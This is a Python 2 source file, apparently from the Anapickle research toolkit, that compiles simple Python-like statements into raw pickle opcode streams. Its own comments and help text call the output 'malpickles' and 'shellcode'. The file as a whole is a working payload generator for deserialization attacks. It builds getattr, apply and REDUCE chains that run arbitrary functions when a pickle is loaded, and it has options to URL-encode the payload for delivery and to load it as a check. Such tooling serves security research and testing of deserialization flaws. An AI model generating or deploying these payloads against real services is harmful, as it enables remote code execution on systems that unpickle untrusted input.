import sys
import re
import time
from types import NoneType
from anapickle import Anapickle
import getopt
import string
import random
import pprint
import urllib

#this isn't a true compiler in any sense, we merely try to match specific 
#patterns and apply pickle templates

class Converter:

  def sprint(self, msg):
    sys.stderr.write('[*] %s\n'%msg)
    sys.stderr.flush()

  def get_memo(self, item):
#    for i in self.memo:
#      if i["name"] = item:
#        return i["slot"]
#    return None
    if self.memo.has_key(item):
      self.sprint('Found a slot for %s'%item)
      return self.memo[item]

    self.sprint('No slot found for %s'%item)
    return None

  def set_memo(self, item):
    r = self.get_memo(item)

    if r == None:
      self.memo[item] = self.next_open_memo_slot
      self.sprint('Created slot %d for %s'%(self.next_open_memo_slot,item))
      self.next_open_memo_slot += 1

    return self.memo[item]

  def break_it_down(self, args):
    t = type(args)

    out = ""
    if t == tuple:
      out = "("
      for i in args:
        out += self.break_it_down(i)
      out += "t"
      return out
    elif t == list:
      out = "("
      for i in args:
        out += self.break_it_down(i)
      out += "l"
      return out
    elif t == dict:
      out = "("
      for k,v in args.items():
        out += self.break_it_down(k)
        out += self.break_it_down(v)
      out += "d"
      return out
    elif t == str:
      return "S'%s'\n" % args
    elif t == int:
      return "I%d\n" % args
    elif t == unicode:
      return "V%s\n" % str(args)
    elif t == NoneType:
      return "N"
    else:
      raise Exception("How the hell do I deal with type '%s'?" % str(t))

  def get_rand_name(self, var):
    a=list(string.uppercase)
    random.shuffle(a)
    return 'rand_%s_%s' % (var,''.join(a))

  def format_args(self, args):
    #substitute any variables by eval'ing, watching for NameErrors and monkey patching
    var_subs = {}
    done = False
    self.sprint(args)
    while not done:
      try:
        eval(args)
        done = True
      except NameError, e:
        r = re.match('name \'(.*)\' is not defined',e.message)
        missing_var = r.group(1)
        name = self.get_rand_name(missing_var)
        var_subs[name] = self.get_memo(missing_var)

        self.sprint('storing %s (%s)' % (missing_var,name))

#now figure out where in the string to patch
#first/only arg?
        r1 = re.match('(\([ \[]*)%s *,(.*)'%missing_var,args)
        if r1 != None:
          args = '%s\'%s\',%s' % (r1.group(1),name, r1.group(2))

        else:
#last arg
          r1 = re.match('(.*), *%s([ \]]*),(.*)'%missing_var,args)
          if r1 != None:
            args = '%s,\'%s\'%s,%s' % (r1.group(1),name,r1.group(2),r1.group(3))
          else:
            self.sprint('Can\'t figure out where to monkeypatch %s' % missing_var)
            sys.exit(1)


        #eval(compile('%s = "%s"' % (name,name),'','exec'))
        #r1 = re.match('(.*), *%s *,?')

        #args.replace
    try:
      out = self.break_it_down(eval(args))
    except SyntaxError, e:
      self.sprint("Error in arguments '%s'" % args)
      self.sprint(repr(e))
      sys.exit(1)

    for k in var_subs.keys():
      out = out.replace('S\'%s\'\n'%k,'g%d\n'%var_subs[k])
    return out

  def get_type(self, line, meth):

    if self.instance_cache.has_key(meth):
      return self.instance_cache[meth]

    module_class = {}
    while len(module_class) == 0:
      self.sprint("In the line '%s', which type is instance '%s'? (I need a full module.class path):" % (line, meth)),
      m_c = sys.stdin.readline().strip()
      idx = m_c.rfind(".")
      if idx > -1:
        module_class["module"] = m_c[0:idx]
        module_class["class"] = m_c[idx+1:]
    self.instance_cache[meth] = module_class
    return module_class

  def to_pickle(self, python):
    var_re = "[a-zA-Z_0-9]+"
    mod_re = "[a-zA-Z_0-9.]+"
    meth_re = mod_re
    args_re = "\(.*\)"
    hint_re = " \[(.*)\]"
    anno_re = " \{(.*)\}"

    picklestream = ""
    for line in python:
      self.sprint('Stream: '+pprint.pformat(picklestream)+"\n")
      self.sprint('Next line is: '+line.strip())
      if line[0] == "#":
        continue
      line = line.strip()

#Push a None onto the stack. Useful for malpickles without side effects, to keep the pickle clean
      r = re.match("(NONE)",line)
      if r != None:
        self.sprint('None')
        picklestream+= "N"
        continue

#Push a string onto the stack. Useful for malpickles without side effects, to keep the pickle clean
      r = re.match("^\"(.*)\"$",line)
      if r != None:
        self.sprint('String literal')
        string = r.group(1)
        picklestream+= "S'%s'\n"%string
        continue


#An explicit reduce. This assumes the stack already has a callable, and we simply push the arguments and REDUCE
#Our sequence cleans up the stack, and leaves the result in a register
      r = re.match("(%s) = pickle.R(%s)?"%(var_re, args_re),line)
      if r != None:
        self.sprint('manual reduce')
        var = r.group(1)
        args = self.format_args(r.group(2))

        slot = self.set_memo(var)
        self.sprint(pprint.pformat(args))
        picklestream+= "%sRp%d\n0" % (args,slot)
        continue

      r = re.match("(%s) = (%s)\.(%s)(%s)"%(var_re, mod_re, meth_re, anno_re),line)
#annotated call. currently supports retrieving constants
      if r != None:
        self.sprint('annotated assignment')
        var = r.group(1)
        mod = r.group(2)
        const = r.group(3)
        anno = r.group(4)

        if anno == " {const}":
          vslot = self.set_memo(var)
          mslot = self.set_memo(self.get_rand_name(mod))
          cslot = self.set_memo(self.get_rand_name(const))
          picklestream+="c%s\n__dict__\np%d\n0c__builtin__\ngetattr\n(g%d\nS'__getitem__'\ntRp%d\n0g%d\n(S'%s'\ntRp%d\n0" % (mod,mslot,mslot,cslot,cslot,const,vslot)
        else:
          self.sprint("Unknown annotation \"%s\")" % anno)
          sys.exit(1)
        continue




      r = re.match("(%s) = (%s)\.(%s)(%s)(%s)?"%(var_re, mod_re, meth_re, args_re, hint_re),line)
      if r != None:
        self.sprint('method call assignment')
#method call assigned to a var
#        var = r.group(1)
#        mod = r.group(2)
#        meth = r.group(3)
#        args = self.format_args(r.group(4))

#        slot = self.set_memo(var)

#        picklestream += "c%s\n%s\n%sRp%d\n0" % (mod, meth, args, slot)

        var = r.group(1)
        mod = r.group(2)
        meth = r.group(3)
        args = self.format_args(r.group(4))
        self.sprint(pprint.pformat(args))

        instance = self.get_memo(mod)
        if instance == None:
          self.sprint('No slot saved for %s, assuming a module'%mod)
          slot = self.set_memo(var)
#this is a module since we don't have a stored instance
          picklestream += "c%s\n%s\n%sRp%d\n0" % (mod, meth, args, slot)
        else:
#this is a class instance
          self.sprint('Found saved slot for %s: %d'%(mod,instance))
          type = None
          if len(r.groups()) == 6 and r.group(6) != None:
            m_c = r.group(6)
            idx = m_c.rfind(".")
            if idx > -1:
              type = {}
              type["module"] = m_c[0:idx]
              type["class"] = m_c[idx+1:]
              self.instance_cache[mod] = type
            else:
              self.sprint("Could not extract module.class from the hint '%s'." % m_c)

          if type == None:
            type = self.get_type(line, mod)

          tmp_slot = self.set_memo(self.get_rand_name('tmp_slot'))
          picklestream += "c__builtin__\ngetattr\n(c%s\n%s\nS'%s'\ntRp%d\n0c__builtin__\napply\n(g%d\n(g%d\n%sltRp%d\n0" % \
            (type["module"], type["class"], meth, tmp_slot, tmp_slot, instance, args[1:-1],self.set_memo(var))
        continue

      r = re.match("(%s) = (%s)\.(%s)"%(var_re, mod_re, meth_re),line)
      if r != None:
        self.sprint('method handler assignment')
#method call assigned to a var
#        var = r.group(1)
#        mod = r.group(2)
#        meth = r.group(3)
#        args = self.format_args(r.group(4))

#        slot = self.set_memo(var)

#        picklestream += "c%s\n%s\n%sRp%d\n0" % (mod, meth, args, slot)

        var = r.group(1)
        mod = r.group(2)
        meth = r.group(3)

        instance = self.get_memo(mod)
        if instance == None:
          self.sprint('No slot saved for %s, assuming a module'%mod)
          slot = self.set_memo(var)
#this is a module since we don't have a stored instance
          picklestream += "c%s\n%s\np%d\n0" % (mod, meth, slot)
        else:
#this is a class instance
          self.sprint('can\'t handle method handle assignment for call instances')
        continue
 
      r = re.match("(%s)\.(%s)(%s)(%s)?"%(var_re, meth_re, args_re, hint_re),line)
      if r != None:
        self.sprint('method call')
#method call on class instance OR module callable call where the return value is discarded
        mod = r.group(1)
        meth = r.group(2)
        args = r.group(3)

        instance = self.get_memo(mod)
        if instance == None:
          self.sprint('No slot saved for %s, assuming a module'%mod)
#this is a module since we don't have a stored instance
          picklestream += "c%s\n%s\n%stR\n0" % (mod, meth, args)
        else:
#this is a class instance
          self.sprint('Found saved slot for %s: %d'%(mod,instance))
          type = None
          if len(r.groups()) == 5 and r.group(5) != None:
            m_c = r.group(5)
            idx = m_c.rfind(".")
            if idx > -1:
              type = {}
              type["module"] = m_c[0:idx]
              type["class"] = m_c[idx+1:]
              self.instance_cache[mod] = type
            else:
              self.sprint("Could not extract module.class from the hint '%s'." % m_c)

          if type == None:
            type = self.get_type(line, mod)

          tmp_slot = self.set_memo("tmp_slot_%s" % str(time.time()))
          picklestream += "c__builtin__\ngetattr\n(c%s\n%s\nS'%s'\ntRp%d\n0c__builtin__\napply\n(g%d\n(g%d\nltR" % \
            (type["module"], type["class"], meth, tmp_slot, tmp_slot, instance)
        continue
      r = re.match("(%s)"%(var_re),line)
      if r != None:
        self.sprint('variable return')
        instance = self.get_memo(r.group(1))
        if instance != None:
          picklestream += 'g%d\n' % instance
        continue


    self.sprint("Stream: " +repr(picklestream))
    return picklestream

  def print_usage_and_exit(self):
    print("""converttopickle.py [ -v ] <filename>

\t-h
\t\tthis help
\t-a
\t\tMake shellcode standalone
\t-b
\t\tURL encode the shellcode
\t-p
\t\tOutput a Python compatible string
\t-s
\t\tSimulate the pickle
\t-v
\t\tActually load and verify the shellcode
\t-o <file>
\t\tOutput to <file>
""")
    sys.exit(0)


  def __init__(self, argv):
    self.memo = {}
    self.instance_cache = {}
    self.next_open_memo_slot = 100
    self.verify = False
    self.simulate = False
    self.output_file = None
    self.standalone = False
    self.output_python = False
    self.urlencode = False

    try:                                
      opts, leftovers = getopt.getopt(argv, "absvo:p") 
    except getopt.GetoptError:           
      self.print_usage_and_exit()


    for opt, arg in opts:
      if opt == "-h":
        self.print_usage_and_exit()
      elif opt == "-s":
        self.simulate = True
      elif opt == "-v":
        self.verify = True
      elif opt == "-o":
        self.output_file = arg
      elif opt == "-a":
        self.standalone = True
      elif opt == "-p":
        self.output_python = True
      elif opt == "-b":
        self.urlencode = True
    
    if (self.verify or self.simulate) and (self.output_python or self.urlencode):
      print("If using -v or -s, don't change the output format with -p or -b")
      sys.exit(1)
      
    f = open(leftovers[0])

    self.python = f.readlines()

    f.close()

    self.picklestream = self.to_pickle(self.python)

    if self.standalone:
      self.picklestream += '.'

    if self.urlencode:
      self.picklestream = urllib.quote(self.picklestream)

    if self.output_python:
      self.sprint("Converting to python")
      self.picklestream = repr(self.picklestream)

    if self.output_file != None:
      f=open(self.output_file,'w')
      f.write(self.picklestream)
      f.close()
    else:
      print self.picklestream

    if self.verify or self.simulate:

      if not self.standalone:
        self.picklestream += '.'
      a = Anapickle(self.picklestream)

      if self.simulate:
        self.sprint("Simulating...")
        a.sim_pickle()
        self.sprint(a.format_pickle_summary())

      if self.verify:
        if a.load_pickle() == True:
          self.sprint('\n Loaded pickle has type '+str(type(a.lpickle)))
          self.sprint('\n Loaded pickle returns '+str(repr(a.lpickle)))
        else:
          self.sprint('\n Pickle failed to verify')




def main(argv):
  am = Converter(argv)
    #Anapickle(pickle_4,loadpickle = True)

if __name__ == "__main__":
  main(sys.argv[1:])
